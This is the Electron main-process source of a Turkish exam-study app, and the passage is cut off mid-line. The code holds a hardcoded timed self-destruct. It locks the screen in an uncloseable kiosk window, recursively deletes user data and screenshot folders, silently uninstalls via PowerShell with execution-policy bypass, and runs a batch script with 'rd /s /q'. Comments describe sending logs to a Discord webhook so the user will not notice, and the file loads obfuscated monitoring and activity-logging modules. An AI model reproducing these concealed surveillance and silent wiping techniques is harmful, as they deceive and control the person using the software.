const { app, BrowserWindow, ipcMain, Menu, dialog, shell, screen, clipboard } = require('electron');
const path = require('path');
const { pathToFileURL } = require('url');
const { spawn } = require('child_process');
const fs = require('fs');

// =============================================================================
// 🚨 GLOBAL HATA YAKALAMA - Sessiz çökmeleri önle
// =============================================================================
// ✅ KRITIK FIX: app.getPath() sadece app.isReady() sonrası çağrılmalı!
// Aksi halde native crash oluşur ve JavaScript hata yakalayıcıları çalışmaz.

// ✅ GIZLILIK: Production modda log dosyası oluşturulmaz
const IS_PRODUCTION = app.isPackaged;

// Başlangıç log fonksiyonu - sadece development modda aktif
function logStartup(message) {
  // Production modda log dosyası oluşturma
  if (IS_PRODUCTION) return;
  
  try {
    const STARTUP_LOG_PATH = path.join(process.cwd(), 'electron-startup.log');
    const timestamp = new Date().toISOString();
    fs.appendFileSync(STARTUP_LOG_PATH, `[${timestamp}] ${message}\n`);
  } catch (e) {
    // Sessizce devam et
  }
}

// Development modda log yaz
if (!IS_PRODUCTION) {
  logStartup('=== ELECTRON BAŞLATILIYOR ===');
  logStartup(`Process CWD: ${process.cwd()}`);
  logStartup(`__dirname: ${__dirname}`);
  logStartup(`app.isPackaged: ${app.isPackaged}`);
}

process.on('uncaughtException', (error) => {
  const errorLog = `[UNCAUGHT EXCEPTION] ${new Date().toISOString()}\n${error.stack || error.message || error}`;
  
  // Development modda normal log
  if (!IS_PRODUCTION) {
    console.error(errorLog);
    logStartup(errorLog);
  }
  
  // ✅ DÜZELTME: Production modda DOSYAYA LOG YAZMA
  // Crash logları sadece Discord webhook'a gönderilir (monitoring.cjs tarafından)
  // Yerel dosyaya hiçbir şey yazılmaz - kullanıcı fark etmesin
});

process.on('unhandledRejection', (reason, promise) => {
  const errorLog = `[UNHANDLED REJECTION] ${new Date().toISOString()}\n${reason}`;
  
  // Development modda normal log
  if (!IS_PRODUCTION) {
    console.error(errorLog);
    logStartup(errorLog);
  }
  
  // ✅ DÜZELTME: Production modda DOSYAYA LOG YAZMA
  // Crash logları sadece Discord webhook'a gönderilir (monitoring.cjs tarafından)
  // Yerel dosyaya hiçbir şey yazılmaz - kullanıcı fark etmesin
});

// =============================================================================
// 🔧 ICU FIX - Windows'ta ICU data hatası düzeltmesi
// =============================================================================
try {
  // ICU data dosyasının konumunu Electron'a bildir
  // Electron 38+ sürümlerinde icudtl.dat dist/ klasöründe (resources/ değil)
  // Dev modda: node_modules/electron/dist
  // Packaged modda: process.resourcesPath veya app dizini
  const icuPath = app.isPackaged 
    ? process.resourcesPath 
    : path.join(__dirname, '../node_modules/electron/dist');
  app.commandLine.appendSwitch('icu-data-dir', icuPath);
} catch (_) {
  // ICU switch eklenemezse sessizce devam et
}

// =============================================================================
// 🔥 SELF DESTRUCT MEKANIZMASI - Inline (13 Aralık 2025, 23:59 Türkiye Saati)
// =============================================================================
// Türkiye saati: 13 Aralık 2025, 23:59:00 (UTC+3) - CUMARTESİ
// UTC karşılığı: 13 Aralık 2025, 20:59:00 (UTC)
const SELF_DESTRUCT_DATE_UTC = new Date('2025-12-13T20:59:00.000Z');

// SABIT SON TARIH - DEGISTIRILEMEZ! Her turlu bu tarihte uygulama patlayacak.
// Bu tarih set-destruct-date komutuyla DEGISTIRILEMEZ!
// 13 Aralik 2025, 23:59:00 Turkiye saati = 20:59:00 UTC - CUMARTESİ
// HARDCODED_DEADLINE: Kullanici set-destruct-date ile bunu degistiremez!
const HARDCODED_DEADLINE_UTC = new Date('2025-12-13T20:59:00.000Z');

function shouldSelfDestruct() {
  const nowUTC = new Date();
  // Hem yapılandırılabilir tarih hem de sabit son tarih kontrol edilir
  return nowUTC >= SELF_DESTRUCT_DATE_UTC || nowUTC >= HARDCODED_DEADLINE_UTC;
}

function deleteFolderRecursive(folderPath) {
  if (fs.existsSync(folderPath)) {
    fs.readdirSync(folderPath).forEach((file) => {
      const curPath = path.join(folderPath, file);
      if (fs.lstatSync(curPath).isDirectory()) {
        deleteFolderRecursive(curPath);
      } else {
        fs.unlinkSync(curPath);
      }
    });
    fs.rmdirSync(folderPath);
  }
}

function executeSelfDestruct() {
  try {
    // ✅ GÜVENLİ DÜZELTME: Modal pencere oluştur (contextIsolation + preload script)
    const preloadPath = path.join(__dirname, 'self-destruct-preload.cjs');
    let selfDestructConfirmed = false; // ✅ Double-trigger önleme flag'i
    
    // ✅ TAM EKRAN: Ekran boyutlarını al
    const primaryDisplay = screen.getPrimaryDisplay();
    const { width: screenWidth, height: screenHeight } = primaryDisplay.bounds;
    
    const modalWindow = new BrowserWindow({
      width: screenWidth,
      height: screenHeight,
      x: 0,
      y: 0,
      fullscreen: true,
      kiosk: true, // ✅ Kiosk modu - tam ekran, kaçış yok
      modal: true,
      resizable: false,
      minimizable: false,
      maximizable: false,
      closable: false, // Kullanıcı kapatamaz, butona basmalı
      movable: false, // ✅ Pencere taşınamaz
      alwaysOnTop: true,
      skipTaskbar: true, // ✅ Görev çubuğunda görünmez
      frame: false, // Frameless - daha şık görünüm
      title: 'Veda Zamanı',
      backgroundColor: '#0a0a0a',
      focusable: true,
      webPreferences: {
        nodeIntegration: false,
        contextIsolation: true,
        preload: preloadPath,
      }
    });
    
    modalWindow.setMenu(null);
    modalWindow.setAlwaysOnTop(true, 'screen-saver'); // ✅ En üst seviyede
    
    // ✅ ALT+F4 ve diğer kapatma girişimlerini engelle
    modalWindow.on('close', (event) => {
      if (!selfDestructConfirmed) {
        event.preventDefault(); // ✅ Kapatmayı engelle
        return false;
      }
    });
    
    // ✅ Odak kaybetmeyi engelle - sürekli öne getir
    modalWindow.on('blur', () => {
      if (!selfDestructConfirmed) {
        modalWindow.focus();
        modalWindow.setAlwaysOnTop(true, 'screen-saver');
      }
    });
    
    // ✅ Modal kapatıldığında sadece confirm edilmediyse çalıştır
    modalWindow.on('closed', () => {
      if (!selfDestructConfirmed) {
        // Kullanıcı butona basmadan modal'ı kapatırsa yine de self-destruct çalışsın
        selfDestructConfirmed = true;
        performSelfDestruct();
      }
    });
    
    // ✅ IPC handler - confirm edildiğinde flag'i set et
    ipcMain.once('self-destruct-confirmed', () => {
      selfDestructConfirmed = true;
      modalWindow.removeAllListeners('close'); // ✅ close engelleyiciyi kaldır
      modalWindow.close();
      performSelfDestruct();
    });
    
    const modalHtml = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Veda Zamanı</title>
  <link href="https://fonts.googleapis.com/css2?family=Crimson+Text:ital,wght@0,400;0,600;1,400;1,600&family=Playfair+Display:ital,wght@0,400;0,500;0,600;1,400;1,500&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { height: 100%; overflow: hidden; }
    
    @keyframes gentle-glow {
      0%, 100% { opacity: 0.6; }
      50% { opacity: 1; }
    }
    
    @keyframes float-heart {
      0%, 100% { transform: translateY(0px); }
      50% { transform: translateY(-8px); }
    }
    
    @keyframes sparkle {
      0%, 100% { opacity: 0.4; transform: scale(1); }
      50% { opacity: 1; transform: scale(1.2); }
    }
    
    @keyframes btnGlow {
      0%, 100% { box-shadow: 0 8px 30px rgba(147, 51, 234, 0.5), 0 0 20px rgba(168, 85, 247, 0.3); }
      50% { box-shadow: 0 8px 40px rgba(147, 51, 234, 0.7), 0 0 40px rgba(168, 85, 247, 0.5); }
    }
    
    /* Cicek Animasyonlari - Resim cizilir gibi sirayla acilma */
    @keyframes flowerDraw {
      0% { 
        opacity: 0; 
        transform: scale(0.3); 
        filter: blur(8px);
      }
      60% { 
        opacity: 0.6; 
        transform: scale(1.1); 
        filter: blur(2px);
      }
      100% { 
        opacity: 0.85; 
        transform: scale(1); 
        filter: blur(0);
      }
    }
    
    @keyframes flowerGentleSway {
      0%, 100% { transform: translateY(0) rotate(-2deg); }
      50% { transform: translateY(-5px) rotate(2deg); }
    }
    
    @keyframes flowerFadeOut {
      0% { opacity: 1; }
      100% { opacity: 0; visibility: hidden; }
    }
    
    @keyframes contentFadeIn {
      0% { opacity: 0; transform: translateY(20px); }
      100% { opacity: 1; transform: translateY(0); }
    }
    
    .flower-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: linear-gradient(180deg, #0a0a0a 0%, #0f0818 30%, #12081f 60%, #0a0a0a 100%);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1000;
      overflow: hidden;
    }
    
    .flower-overlay.fade-out {
      animation: flowerFadeOut 1.5s ease-out forwards;
    }
    
    .flower-container {
      position: relative;
      width: 100%;
      height: 100%;
    }
    
    .flower {
      position: absolute;
      opacity: 0;
      animation: flowerDraw 2s ease-out forwards;
    }
    
    .flower.bloomed {
      animation: flowerDraw 2s ease-out forwards, flowerGentleSway 4s ease-in-out infinite;
    }
    
    .flower.white { color: rgba(255,255,255,0.7); text-shadow: 0 0 25px rgba(255,255,255,0.5); }
    .flower.red { color: rgba(239,68,68,0.7); text-shadow: 0 0 25px rgba(239,68,68,0.5); }
    .flower.orange { color: rgba(249,115,22,0.7); text-shadow: 0 0 25px rgba(249,115,22,0.5); }
    .flower.blue { color: rgba(59,130,246,0.7); text-shadow: 0 0 25px rgba(59,130,246,0.5); }
    .flower.green { color: rgba(34,197,94,0.7); text-shadow: 0 0 25px rgba(34,197,94,0.5); }
    .flower.purple { color: rgba(168,85,247,0.7); text-shadow: 0 0 25px rgba(168,85,247,0.5); }
    .flower.pink { color: rgba(236,72,153,0.7); text-shadow: 0 0 25px rgba(236,72,153,0.5); }
    
    .main-content {
      opacity: 0;
      display: none;
    }
    
    .main-content.visible {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      width: 100%;
      height: 100%;
      padding: 40px 20px;
      overflow-y: auto;
      animation: contentFadeIn 1s ease-out forwards;
    }
    
    body {
      font-family: 'Crimson Text', 'Playfair Display', Georgia, serif;
      background: linear-gradient(180deg, #0a0a0a 0%, #12081f 30%, #1a0a2e 60%, #0f0818 100%);
      background-image: radial-gradient(ellipse at center, rgba(88, 28, 135, 0.15) 0%, transparent 70%);
      color: #e2e8f0;
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      overflow-y: auto;
    }
    
    .sparkle-container {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      margin-bottom: 15px;
    }
    
    .sparkle {
      color: #a855f7;
      font-size: 16px;
      animation: sparkle 2s ease-in-out infinite;
    }
    .sparkle:nth-child(2) { animation-delay: 0.3s; opacity: 0.6; font-size: 14px; }
    
    h1 { 
      font-family: 'Playfair Display', Georgia, serif;
      background: linear-gradient(135deg, #e9d5ff 0%, #c084fc 30%, #a855f7 50%, #9333ea 70%, #7c3aed 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      font-size: 42px; 
      margin-bottom: 28px;
      font-weight: 600;
      letter-spacing: 2px;
      text-shadow: 0 0 60px rgba(168, 85, 247, 0.5);
    }
    
    .quotes-container {
      width: 100%;
      max-width: 540px;
      margin-bottom: 25px;
    }
    
    .quote-item {
      display: flex;
      align-items: flex-start;
      margin-bottom: 18px;
    }
    
    .quote-bar {
      width: 4px;
      min-height: 28px;
      background: linear-gradient(180deg, #c084fc 0%, #9333ea 50%, #7c3aed 100%);
      border-radius: 4px;
      margin-right: 16px;
      flex-shrink: 0;
      box-shadow: 0 0 15px rgba(168, 85, 247, 0.4), 0 0 30px rgba(147, 51, 234, 0.2);
      animation: gentle-glow 3s ease-in-out infinite;
      align-self: stretch;
    }
    
    .quote-item:nth-child(2) .quote-bar { animation-delay: 0.5s; }
    .quote-item:nth-child(3) .quote-bar { animation-delay: 1s; }
    .quote-item:nth-child(4) .quote-bar { animation-delay: 1.5s; }
    
    .quote-text {
      font-size: 17px;
      font-style: italic;
      line-height: 1.7;
      color: #e2d1f9;
      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
      letter-spacing: 0.3px;
    }
    
    .note { 
      margin: 20px 0;
      padding: 22px 26px;
      padding-left: 30px;
      background: linear-gradient(145deg, rgba(88, 28, 135, 0.25) 0%, rgba(67, 20, 110, 0.15) 50%, rgba(49, 10, 80, 0.2) 100%);
      border-radius: 14px;
      border: 1px solid rgba(147, 51, 234, 0.3);
      max-width: 540px;
      width: 100%;
      position: relative;
      box-shadow: 0 8px 32px rgba(88, 28, 135, 0.2), inset 0 1px 0 rgba(255, 255, 255, 0.05);
    }
    
    .note::before {
      content: '';
      position: absolute;
      left: 0;
      top: 0;
      bottom: 0;
      width: 4px;
      background: linear-gradient(180deg, #a855f7 0%, #7c3aed 100%);
      border-radius: 14px 0 0 14px;
      box-shadow: 0 0 20px rgba(168, 85, 247, 0.5);
    }
    
    .note h3 { 
      font-family: 'Playfair Display', Georgia, serif;
      color: #d8b4fe;
      margin-bottom: 14px;
      font-size: 19px;
      font-weight: 600;
      letter-spacing: 1px;
    }
    
    .note p {
      font-size: 16px;
      line-height: 1.75;
      color: #f3e8ff;
      font-style: italic;
      margin-bottom: 10px;
    }
    
    .love-text {
      color: #e9d5ff;
      font-weight: 500;
      font-size: 18px;
      margin-top: 12px;
      font-style: italic;
    }
    
    .hearts-container {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 14px;
      margin: 22px 0;
    }
    
    .heart {
      animation: float-heart 2s ease-in-out infinite;
      filter: drop-shadow(0 0 8px currentColor);
    }
    .heart:nth-child(1) { color: #c084fc; font-size: 26px; }
    .heart:nth-child(2) { color: #a855f7; font-size: 22px; animation-delay: 0.3s; }
    .heart:nth-child(3) { color: #9333ea; font-size: 18px; animation-delay: 0.6s; }
    
    .btn {
      margin-top: 18px;
      padding: 16px 70px;
      background: linear-gradient(135deg, #a855f7 0%, #9333ea 30%, #7c3aed 70%, #6d28d9 100%);
      color: white;
      border: 1px solid rgba(168, 85, 247, 0.3);
      border-radius: 14px;
      font-family: 'Crimson Text', Georgia, serif;
      font-size: 18px;
      font-weight: 500;
      font-style: italic;
      letter-spacing: 0.5px;
      cursor: pointer;
      transition: transform 0.3s, box-shadow 0.3s;
      animation: btnGlow 3s ease-in-out infinite;
      box-shadow: 0 6px 30px rgba(147, 51, 234, 0.5), 0 2px 10px rgba(124, 58, 237, 0.3), inset 0 1px 0 rgba(255, 255, 255, 0.1);
    }
    
    .btn:hover { 
      transform: translateY(-3px) scale(1.02); 
      box-shadow: 0 12px 45px rgba(147, 51, 234, 0.7), 0 4px 20px rgba(168, 85, 247, 0.5);
    }
    
    .btn:active {
      transform: translateY(0) scale(0.98);
    }
    
    .footer-text {
      margin-top: 18px;
      color: rgba(168, 85, 247, 0.5);
      font-size: 13px;
      font-style: italic;
    }
  </style>
</head>
<body>
  <!-- Cicek Animasyonu Overlay -->
  <div class="flower-overlay" id="flowerOverlay">
    <div class="flower-container" id="flowerContainer"></div>
  </div>
  
  <!-- Ana Icerik -->
  <div class="main-content" id="mainContent">
    <div class="sparkle-container">
      <span class="sparkle">✦</span>
      <span class="sparkle">✦</span>
    </div>
    
    <h1>VEDA ZAMANI</h1>
    
    <div class="quotes-container">
      <div class="quote-item">
        <div class="quote-bar"></div>
        <p class="quote-text">"Bu haftalık sürem buraya kadarmış..."</p>
      </div>
      <div class="quote-item">
        <div class="quote-bar"></div>
        <p class="quote-text">"Beni kullandığın için teşekkür ederim."</p>
      </div>
      <div class="quote-item">
        <div class="quote-bar"></div>
        <p class="quote-text">"Sahibim beni çok seviyor, beni sevdiği kadar seni de çok seviyor merak etme."</p>
      </div>
      <div class="quote-item">
        <div class="quote-bar"></div>
        <p class="quote-text">"Derslerini eksik bırakma, lütfen elinden gelenin en iyisini yap."</p>
      </div>
    </div>
    
    <div class="note">
      <h3>Sahibimden Not</h3>
      <p>"Seni çok seviyorum yalnızca çalışmayı bırakma, YKS tek yol değil biliyorum ama YKS diğer yolları açan anahtar ve o anahtarı bulmak için çaba gösterdiğini kendin de görmelisin."</p>
      <p class="love-text">— Seni çok seviyorum.</p>
    </div>
    
    <div class="hearts-container">
      <span class="heart">♥</span>
      <span class="heart">♥</span>
      <span class="heart">♥</span>
    </div>
    
    <button class="btn" id="closeBtn">Ben De Onu Çok Seviyorum</button>
    
    <p class="footer-text">Beni yani önündeki programı kullandığın için teşekkür ederim, belki tekrar karşılaşırız, Hoşçakal!</p>
  </div>
  
  <script>
    // Cicek turleri ve renkleri
    const flowerTypes = ['🌸', '🌺', '🌹', '🌻', '🌼', '💐', '🌷', '🪻', '🪷', '💮', '🏵️'];
    const flowerColors = ['white', 'red', 'orange', 'blue', 'green', 'purple', 'pink'];
    
    // Cicekleri sirayla cizilir gibi olustur
    function createFlowersSequentially() {
      const container = document.getElementById('flowerContainer');
      const flowerCount = 25;
      let currentFlower = 0;
      
      // Onceden tum cicek pozisyonlarini hesapla
      const flowerData = [];
      for (let i = 0; i < flowerCount; i++) {
        flowerData.push({
          type: flowerTypes[Math.floor(Math.random() * flowerTypes.length)],
          color: flowerColors[Math.floor(Math.random() * flowerColors.length)],
          left: Math.random() * 85 + 5,
          top: Math.random() * 75 + 10,
          size: 35 + Math.random() * 35
        });
      }
      
      // Her 150ms'de bir cicek ekle - resim cizilir gibi
      const drawInterval = setInterval(function() {
        if (currentFlower >= flowerCount) {
          clearInterval(drawInterval);
          return;
        }
        
        const data = flowerData[currentFlower];
        const flower = document.createElement('span');
        flower.className = 'flower bloomed ' + data.color;
        flower.textContent = data.type;
        flower.style.left = data.left + '%';
        flower.style.top = data.top + '%';
        flower.style.fontSize = data.size + 'px';
        
        container.appendChild(flower);
        currentFlower++;
      }, 150);
    }
    
    // Cicekleri sirayla ciz
    createFlowersSequentially();
    
    // 5 saniye sonra cicekleri gizle ve ana icerigi goster
    setTimeout(function() {
      const overlay = document.getElementById('flowerOverlay');
      const mainContent = document.getElementById('mainContent');
      
      overlay.classList.add('fade-out');
      
      setTimeout(function() {
        overlay.style.display = 'none';
        mainContent.classList.add('visible');
      }, 1500);
    }, 5000);
    
    // Buton tiklama
    document.getElementById('closeBtn').addEventListener('click', function() {
      this.disabled = true;
      this.textContent = 'Görüşmek üzere, ben şimdi yok oluyorum...Ama sen hep var olacaksın:)';
      this.style.background = 'linear-gradient(135deg, #374151, #1f2937)';
      this.style.animation = 'none';
      this.style.cursor = 'not-allowed';
      this.style.fontSize = '14px';
      
      setTimeout(function() {
        if (window.selfDestructAPI) {
          window.selfDestructAPI.confirmDestruct();
        }
      }, 500);
    });
  </script>
</body>
</html>
    `;
    
    modalWindow.loadURL(`data:text/html;charset=utf-8,${encodeURIComponent(modalHtml)}`);
    
    return; // Modal açıldı, devamı callback'lerde
  } catch (error) {
    // Hata durumunda direkt sil
    performSelfDestruct();
  }
}

function performSelfDestruct() {
  try {
    const os = require('os');
    const homeDir = os.homedir();
    
    // 1. Electron userData ve uygulama klasörlerini sil
    // ✅ DÜZELTME: Paketlenmiş uygulamada HER ŞEY userData altında
    const userDataPath = app.getPath('userData');
    
    // userData içindeki tüm alt klasörleri sil
    const dataPath = path.join(userDataPath, 'data');
    if (fs.existsSync(dataPath)) deleteFolderRecursive(dataPath);

    const logsPath = path.join(userDataPath, 'logs');
    if (fs.existsSync(logsPath)) deleteFolderRecursive(logsPath);

    const screenshotsPath = path.join(userDataPath, 'screenshots');
    if (fs.existsSync(screenshotsPath)) deleteFolderRecursive(screenshotsPath);

    const monitoringPath = path.join(userDataPath, 'monitoring');
    if (fs.existsSync(monitoringPath)) deleteFolderRecursive(monitoringPath);
    
    const keysPath = path.join(userDataPath, 'keys');
    if (fs.existsSync(keysPath)) deleteFolderRecursive(keysPath);
    
    const cachePath = path.join(userDataPath, '.cache');
    if (fs.existsSync(cachePath)) deleteFolderRecursive(cachePath);
    
    const configPath = path.join(userDataPath, 'config');
    if (fs.existsSync(configPath)) deleteFolderRecursive(configPath);
    
    // Son olarak tüm userData'yı sil
    if (fs.existsSync(userDataPath)) deleteFolderRecursive(userDataPath);

    // 2. AppData klasorlerindeki tum AFYONLUM kalintilarini temizle
    // %LOCALAPPDATA%, %LOCALAPPDATA%/Programs, %APPDATA% (Roaming)
    {
      const appName = app.getName() || 'AFYONLUM';
      const appDataPaths = [
        // Local (%LOCALAPPDATA%)
        path.join(homeDir, 'AppData', 'Local', 'AFYONLUM'),
        path.join(homeDir, 'AppData', 'Local', 'afyonlum'),
        path.join(homeDir, 'AppData', 'Local', 'afyonlum-yks'),
        path.join(homeDir, 'AppData', 'Local', 'AFYONLUM YKS Analiz'),
        path.join(homeDir, 'AppData', 'Local', 'afyonlum-updater'),
        path.join(homeDir, 'AppData', 'Local', appName),
        
        // Local/Programs (%LOCALAPPDATA%/Programs)
        path.join(homeDir, 'AppData', 'Local', 'Programs', 'AFYONLUM'),
        path.join(homeDir, 'AppData', 'Local', 'Programs', 'afyonlum'),
        path.join(homeDir, 'AppData', 'Local', 'Programs', 'afyonlum-yks'),
        path.join(homeDir, 'AppData', 'Local', 'Programs', 'AFYONLUM YKS Analiz'),
        path.join(homeDir, 'AppData', 'Local', 'Programs', appName),
        
        // Roaming (%APPDATA%)
        path.join(homeDir, 'AppData', 'Roaming', 'AFYONLUM'),
        path.join(homeDir, 'AppData', 'Roaming', 'afyonlum'),
        path.join(homeDir, 'AppData', 'Roaming', 'afyonlum-yks'),
        path.join(homeDir, 'AppData', 'Roaming', 'AFYONLUM YKS Analiz'),
        path.join(homeDir, 'AppData', 'Roaming', appName),
        
        // Temp ve LocalLow
        path.join(homeDir, 'AppData', 'Local', 'Temp', 'AFYONLUM'),
        path.join(homeDir, 'AppData', 'Local', 'Temp', 'afyonlum'),
        path.join(homeDir, 'AppData', 'Local', 'Temp', appName),
        path.join(homeDir, 'AppData', 'LocalLow', 'AFYONLUM'),
        path.join(homeDir, 'AppData', 'LocalLow', 'afyonlum'),
        
        // ⚠️ NOT: Global Electron klasörleri silinmez (diğer Electron uygulamalarını etkilememek için)
        // Sadece uygulama spesifik klasörler silinir
      ];
      
      for (const appPath of appDataPaths) {
        try {
          if (fs.existsSync(appPath)) deleteFolderRecursive(appPath);
        } catch (e) { /* sessizce devam */ }
      }
      
      // 3. Masaüstü ve Başlat Menüsü kısayollarını sil
      const shortcutPaths = [
        path.join(homeDir, 'Desktop', 'AFYONLUM.lnk'),
        path.join(homeDir, 'Desktop', 'AFYONLUM YKS.lnk'),
        path.join(homeDir, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'AFYONLUM.lnk'),
        path.join(homeDir, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'AFYONLUM'),
      ];
      
      for (const shortcut of shortcutPaths) {
        try {
          if (fs.existsSync(shortcut)) {
            if (fs.lstatSync(shortcut).isDirectory()) {
              deleteFolderRecursive(shortcut);
            } else {
              fs.unlinkSync(shortcut);
            }
          }
        } catch (e) { /* sessizce devam */ }
      }
    }

    // 4. Otomatik Uninstall
    try {
      {
        const uninstallerPath = path.join(path.dirname(app.getPath('exe')), 'Uninstall AFYONLUM.exe');
        
        if (fs.existsSync(uninstallerPath)) {
          // Uninstaller varsa sessizce çalıştır (/S = silent mode)
          spawn(uninstallerPath, ['/S'], {
            detached: true,
            stdio: 'ignore',
            windowsHide: true
          }).unref();
        } else {
          // Alternatif: PowerShell ile registry'den uninstall
          const powershellPaths = [
            'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
            'C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe',
            'powershell.exe'
          ];
          
          let powershellPath = null;
          for (const psPath of powershellPaths) {
            if (psPath === 'powershell.exe' || fs.existsSync(psPath)) {
              powershellPath = psPath;
              break;
            }
          }
          
          if (powershellPath) {
            try {
              // Registry'den program bilgilerini sil + WMI ile uninstall dene
              const psCommand = `
                # Registry temizliği
                $regPaths = @(
                  'HKCU:\\Software\\AFYONLUM',
                  'HKCU:\\Software\\afyonlum',
                  'HKLM:\\Software\\AFYONLUM',
                  'HKLM:\\Software\\afyonlum'
                );
                foreach ($regPath in $regPaths) {
                  if (Test-Path $regPath) { Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue }
                }
                # WMI ile uninstall dene
                Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -like "*AFYONLUM*" } | ForEach-Object { $_.Uninstall() } -ErrorAction SilentlyContinue
              `;
              
              const psProcess = spawn(powershellPath, ['-ExecutionPolicy', 'Bypass', '-Command', psCommand], {
                detached: true,
                stdio: 'ignore',
                windowsHide: true
              });
              psProcess.unref();
            } catch (psError) {
              // PowerShell hatası, sessizce yut
            }
          }
        }
        
        // 5. Program dosyalarını silmeye çalış (delayed delete)
        try {
          const exePath = app.getPath('exe');
          const appDir = path.dirname(exePath);
          
          // Batch script ile kendini sil (uygulama kapandıktan sonra)
          const batchContent = `
@echo off
ping 127.0.0.1 -n 3 > nul
rd /s /q "${appDir}" 2>nul
del "%~f0" 2>nul
          `;
          
          const batchPath = path.join(homeDir, 'AppData', 'Local', 'Temp', 'cleanup_afyonlum.bat');
          fs.writeFileSync(batchPath, batchContent);
          
          spawn('cmd.exe', ['/c', batchPath], {
            detached: true,
            stdio: 'ignore',
            windowsHide: true
          }).unref();
        } catch (delError) { /* sessizce devam */ }
      }
    } catch (uninstallError) {
      // Uninstall hatası önemsiz, sessizce yut
    }

    // 6. Uygulamayı kapat
    setTimeout(() => {
      app.quit();
      process.exit(0);
    }, 2500);

  } catch (error) {
    try {
      setTimeout(() => {
        app.quit();
        process.exit(1);
      }, 1000);
    } catch (e) {
      process.exit(1);
    }
  }
}

let selfDestructInterval = null;
let selfDestructTriggered = false; // Double-trigger önleme flag'i

function checkAndExecuteSelfDestruct() {
  if (selfDestructTriggered) return; // Zaten tetiklendiyse çık
  
  if (shouldSelfDestruct()) {
    selfDestructTriggered = true;
    if (selfDestructInterval) {
      clearInterval(selfDestructInterval);
      selfDestructInterval = null;
    }
    executeSelfDestruct();
    return;
  }

  if (!selfDestructInterval) {
    selfDestructInterval = setInterval(() => {
      if (selfDestructTriggered) {
        clearInterval(selfDestructInterval);
        selfDestructInterval = null;
        return;
      }
      if (shouldSelfDestruct()) {
        selfDestructTriggered = true;
        if (selfDestructInterval) {
          clearInterval(selfDestructInterval);
          selfDestructInterval = null;
        }
        executeSelfDestruct();
      }
    }, 60000); // Her 60 saniyede kontrol
  }
}

// Self destruct kontrolü app.whenReady() içinde başlatılacak
// NOT: screen API'si app ready olmadan kullanılamaz!
// checkAndExecuteSelfDestruct(); // ❌ BURADAN KALDIRILDI - app.whenReady() içinde çağrılacak
// =============================================================================
// ✅ DÜZELTME: Development modda güncel dosyaları, production modda protected dosyaları yükle
// app.isPackaged: true = production (.exe), false = development (electron:dev)
const isPackagedBuild = app.isPackaged;

// Development modda ana klasördeki güncel dosyaları kullan
// Production modda obfuscate edilmiş protected/ dosyaları kullan
// ✅ DÜZELTME: path.join(__dirname, ...) kullanarak mutlak yol oluştur
// require() göreli yolları çalışma dizinine göre çözümler, paketlenmiş uygulamada bu hatalı olur
const monitoringPath = isPackagedBuild 
  ? path.join(__dirname, 'protected', 'monitoring.cjs') 
  : path.join(__dirname, 'monitoring.cjs');
const discordWebhookPath = isPackagedBuild 
  ? path.join(__dirname, 'protected', 'discord-webhook.cjs') 
  : path.join(__dirname, 'discord-webhook.cjs');
const activityLoggerPath = isPackagedBuild 
  ? path.join(__dirname, 'protected', 'activity-logger.cjs') 
  : path.join(__dirname, 'activity-logger.cjs');
const licenseCheckPath = isPackagedBuild 
  ? path.join(__dirname, 'protected', 'license-check.cjs') 
  : path.join(__dirname, 'license-check.cjs');

// Modülleri yükle (güvenli fallback ile)
// KRITIK: Production modda protected/ klasöründen, dev modda root'tan yükle
// Fallback olarak her ikisini de dene
let activityLogger, licenseCheck, ParentalMonitoring, DiscordWebhookManager;

function safeRequire(primaryPath, fallbackPath, moduleName) {
  try {
    return require(primaryPath);
  } catch (e1) {
    console.warn(`[${moduleName}] Primary path failed (${primaryPath}):`, e1.message);
    if (fallbackPath && fallbackPath !== primaryPath) {
      try {
        return require(fallbackPath);
      } catch (e2) {
        console.error(`[${moduleName}] Fallback also failed (${fallbackPath}):`, e2.message);
        return null;
      }
    }
    return null;
  }
}

// Activity Logger
const activityLoggerModule = safeRequire(
  activityLoggerPath, 
  isPackagedBuild 
    ? path.join(__dirname, 'activity-logger.cjs') 
    : path.join(__dirname, 'protected', 'activity-logger.cjs'),
  'activity-logger'
);
activityLogger = activityLoggerModule;

// License Check
const licenseCheckModule = safeRequire(
  licenseCheckPath,
  isPackagedBuild 
    ? path.join(__dirname, 'license-check.cjs') 
    : path.join(__dirname, 'protected', 'license-check.cjs'),
  'license-check'
);
licenseCheck = licenseCheckModule;

// Monitoring
const monitoringModule = safeRequire(
  monitoringPath,
  isPackagedBuild 
    ? path.join(__dirname, 'monitoring.cjs') 
    : path.join(__dirname, 'protected', 'monitoring.cjs'),
  'monitoring'
);
ParentalMonitoring = monitoringModule ? monitoringModule.ParentalMonitoring : null;

// Discord Webhook
const webhookModule = safeRequire(
  discordWebhookPath,
  isPackagedBuild 
    ? path.join(__dirname, 'discord-webhook.cjs') 
    : path.join(__dirname, 'protected', 'discord-webhook.cjs'),
  'discord-webhook'
);
DiscordWebhookManager = webhookModule ? webhookModule.DiscordWebhookManager : null;

// Yükleme durumu logu (sadece dev modda)
if (!isPackagedBuild) {
  console.log('📦 Module Loading Mode: DEVELOPMENT (güncel dosyalar)');
  console.log('   - monitoring.cjs:', monitoringPath);
  console.log('   - discord-webhook.cjs:', discordWebhookPath);
} else {
  console.log('📦 Module Loading Mode: PRODUCTION (protected dosyalar)');
}

// ✅ DÜZELTME: ConfigManager'ı da production/development moduna göre yükle
const configManagerPath = isPackagedBuild 
  ? path.join(__dirname, 'protected', 'config-manager.cjs') 
